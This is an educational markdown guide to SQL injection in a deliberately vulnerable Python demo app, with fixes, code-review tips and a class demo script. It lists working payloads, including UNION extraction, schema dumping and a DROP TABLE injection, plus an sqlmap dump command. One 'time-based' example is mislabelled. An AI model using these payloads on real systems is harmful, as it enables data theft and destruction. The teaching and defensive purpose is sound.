# 🔓 SQL Injection Demonstration Guide

## ⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️

This guide demonstrates SQL injection vulnerabilities present in the anti-pattern code. **ONLY use these techniques on this demo application in a safe, isolated environment.**

---

## 🎯 Purpose

This demonstration shows:
- How SQL injection works
- Why string concatenation in SQL is dangerous
- The importance of parameterized queries
- Real-world attack scenarios

---

## 🔍 Where the Vulnerabilities Are

### In `student_page.py`:

```python
# Line ~27
query = "SELECT * FROM students WHERE name LIKE '%" + search + "%'"
c.execute(query)
```

### In `grades_page.py`:

```python
# Lines ~30-38
if student_filter:
    query += " AND s.name LIKE '%" + student_filter + "%'"
if course_filter:
    query += " AND g.course LIKE '%" + course_filter + "%'"
```

---

## 💉 SQL Injection Attack Examples

### 1. Basic Injection - View All Data

**Attack**: Bypass the search filter

**Input in Students search**:
```
' OR '1'='1
```

**Resulting SQL**:
```sql
SELECT * FROM students WHERE name LIKE '%' OR '1'='1%'
```

**What happens**: Returns all students regardless of name because `'1'='1'` is always true.

---

### 2. Comment Injection

**Attack**: Use SQL comments to ignore the rest of the query

**Input**:
```
' OR 1=1 --
```

**Resulting SQL**:
```sql
SELECT * FROM students WHERE name LIKE '%' OR 1=1 --%'
```

**What happens**: The `--` comments out everything after it, making the condition always true.

---

### 3. Union-Based Injection

**Attack**: Extract data from other tables

**Input in search**:
```
' UNION SELECT id, course, grade, semester, credits, credits FROM grades --
```

**Resulting SQL**:
```sql
SELECT * FROM students WHERE name LIKE '%' UNION SELECT id, course, grade, semester, credits, credits FROM grades --%'
```

**What happens**: Could potentially show grade data in the students view (depending on column compatibility).

---

### 4. Information Schema Exploitation

**Attack**: Discover database structure

**Input**:
```
' UNION SELECT name, sql, '', '', '', '' FROM sqlite_master WHERE type='table' --
```

**What happens**: Reveals the structure of all tables in the database.

---

### 5. Data Manipulation - DROP TABLE

**Attack**: Delete entire tables (MOST DANGEROUS)

⚠️ **WARNING**: This will destroy data!

**Input**:
```
'; DROP TABLE students; --
```

**Resulting SQL**:
```sql
SELECT * FROM students WHERE name LIKE '%'; DROP TABLE students; --%'
```

**What happens**: Executes two statements - the SELECT and then DROP TABLE, deleting the entire students table.

---

### 6. Time-Based Blind Injection

**Attack**: Test for injection without seeing results

**Input**:
```
' AND (SELECT COUNT(*) FROM students) > 0 --
```

**What happens**: Helps an attacker determine if injection is possible by observing different behaviors.

---

## 🧪 Safe Testing Scenarios

### Test 1: Basic Injection Test

1. Start the server: `python3 terrible_server.py`
2. Navigate to: `http://localhost:5000/students`
3. In the search box, enter: `' OR '1'='1`
4. Click Search
5. **Expected Result**: All students displayed

**Learning Point**: The WHERE clause becomes meaningless, returning all records.

---

### Test 2: Comment-Based Injection

1. Go to students page
2. Search for: `Alice' --`
3. **Expected Result**: May show unexpected results or all records

**Learning Point**: The `--` comments out the rest of the SQL, breaking the intended logic.

---

### Test 3: Filter Bypass in Grades

1. Go to: `http://localhost:5000/grades`
2. In the student search, enter: `' OR '1'='1`
3. **Expected Result**: All grades shown

**Learning Point**: Same vulnerability exists in multiple places.

---

## 🛡️ Prevention - How to Fix

### ❌ NEVER DO THIS:

```python
query = "SELECT * FROM users WHERE name = '" + user_input + "'"
cursor.execute(query)
```

### ✅ ALWAYS DO THIS:

```python
# Using parameterized queries
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))
```

### ✅ OR BETTER - Use an ORM:

```python
# Using SQLAlchemy
users = User.query.filter(User.name == user_input).all()
```

---

## 🔍 How to Detect SQL Injection in Code Reviews

Look for these patterns:

1. **String concatenation with user input**:
   ```python
   query = "SELECT * FROM table WHERE col = '" + user_input + "'"
   ```

2. **String formatting with user input**:
   ```python
   query = f"SELECT * FROM table WHERE col = '{user_input}'"
   query = "SELECT * FROM table WHERE col = '%s'" % user_input
   ```

3. **Direct execution without parameters**:
   ```python
   cursor.execute("SELECT * FROM table WHERE col = '" + input + "'")
   ```

### Safe Alternatives:

```python
# Safe - parameterized query
cursor.execute("SELECT * FROM table WHERE col = ?", (user_input,))

# Safe - ORM
Table.query.filter(Table.col == user_input)

# Safe - prepared statements
cursor.execute("SELECT * FROM table WHERE col = :value", {"value": user_input})
```

---

## 📊 Impact of SQL Injection

| Attack Type | Potential Impact | Severity |
|------------|------------------|----------|
| Authentication Bypass | Unauthorized access | High |
| Data Theft | Stealing sensitive data | Critical |
| Data Manipulation | Modifying/deleting data | Critical |
| Privilege Escalation | Gaining admin access | Critical |
| Database Server Takeover | Full system compromise | Critical |

---

## 🎓 Assignment Ideas

### For Students:

1. **Find and Fix**: Identify all SQL injection points in the code
2. **Attack Simulation**: Try each injection type and document results
3. **Secure Refactor**: Rewrite one function using parameterized queries
4. **Detection Tool**: Write a script to scan Python code for SQL injection vulnerabilities
5. **Comparison Report**: Document the difference between vulnerable and secure code

### For Instructors:

1. **Live Demo**: Demonstrate SQL injection in class
2. **Code Review Exercise**: Have students review and identify vulnerabilities
3. **Security Audit**: Full application security assessment
4. **Remediation Project**: Students fix all vulnerabilities
5. **Penetration Testing**: Ethical hacking exercise (controlled environment)

---

## 🔬 Advanced Demonstrations

### Testing with SQL Injection Tools

You can demonstrate automated tools (in your lab environment):

```bash
# Example with sqlmap (educational purposes only)
sqlmap -u "http://localhost:5000/students?search=test" --batch --dump
```

**Important**: Only use such tools on systems you own or have explicit permission to test!

---

## 📝 Real-World Examples

### Famous SQL Injection Attacks:

1. **Heartland Payment Systems (2008)**
   - 130 million credit cards stolen
   - SQL injection was entry point

2. **TalkTalk (2015)**
   - 157,000 customers affected
   - £400,000 fine
   - Simple SQL injection attack

3. **Sony Pictures (2011)**
   - 1 million user accounts compromised
   - Basic SQL injection vulnerability

**Lesson**: Even large companies with security teams can be vulnerable if developers don't follow secure coding practices.

---

## ✅ Security Best Practices Checklist

- [ ] Always use parameterized queries or prepared statements
- [ ] Use an ORM (SQLAlchemy, Django ORM)
- [ ] Validate all user input
- [ ] Use whitelisting for acceptable input patterns
- [ ] Implement proper error handling (don't expose DB errors to users)
- [ ] Use least privilege for database accounts
- [ ] Keep database systems updated
- [ ] Use web application firewalls (WAF)
- [ ] Regular security audits and penetration testing
- [ ] Security training for all developers

---

## 🎯 Key Takeaways

1. **Never trust user input** - All input is potentially malicious
2. **Use parameterized queries** - This alone prevents most SQL injection
3. **Defense in depth** - Multiple layers of security
4. **Regular testing** - Automated security scanning
5. **Stay educated** - Security threats evolve constantly

---

## 📚 Additional Resources

### Learn More:

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [SQLAlchemy Documentation](https://docs.sqlalchemy.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

### Practice (Legally):

- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

## ⚖️ Legal and Ethical Notice

**IMPORTANT**: 

- Only test on systems you own or have explicit written permission to test
- SQL injection attacks on systems without permission are **ILLEGAL**
- Unauthorized access to computer systems is a crime in most countries
- This demo is for educational purposes only
- Always practice responsible disclosure if you find vulnerabilities

### Responsible Disclosure:

If you find a real vulnerability:
1. Contact the organization privately
2. Give them time to fix it (usually 90 days)
3. Don't publicly disclose until fixed
4. Don't exploit for personal gain

---

## 🎬 Demonstration Script for Instructors

### 15-Minute Class Demo:

**Minutes 0-3**: Explain what SQL injection is
- Show vulnerable code from `student_page.py`
- Explain how string concatenation works

**Minutes 3-8**: Live demonstration
- Start the terrible server
- Show normal search: "Alice"
- Show malicious search: `' OR '1'='1`
- Explain what happened in the SQL

**Minutes 8-12**: Show the fix
- Display the vulnerable code
- Show parameterized query version
- Explain why parameters prevent injection

**Minutes 12-15**: Impact discussion
- Show real-world examples
- Discuss consequences
- Q&A

---

**Remember**: Security is everyone's responsibility. One vulnerable line of code can compromise an entire system!

---

*This guide is part of the Python Anti-Pattern Example project. Use responsibly for education only.*

